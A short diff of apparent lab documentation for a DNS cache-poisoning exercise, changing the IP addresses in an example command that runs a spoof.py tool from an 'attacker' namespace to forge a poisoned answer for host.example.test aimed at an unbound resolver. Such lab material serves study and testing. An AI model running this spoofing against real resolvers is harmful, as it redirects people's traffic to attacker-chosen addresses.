@@ -10,8 +10,8 @@ Needs raw-socket privilege (root in the VM). Example -- forge a poisoned answer
 for host.example.test aimed at unbound, pretending to come from the leaf NS:
 
     ip netns exec attacker python3 /opt/dnsenv/spoof.py \
-        --dst-ip 10.53.0.3 --dst-port 5301 \
-        --src-ip 10.53.0.12 \
+        --dst-ip 203.0.113.3 --dst-port 5301 \
+        --src-ip 203.0.113.12 \
         --qname host.example.test --answer-ip 6.6.6.6 --txid 0x1234
 
 Because it is off-path it does not see the real txid/source-port, so a correct
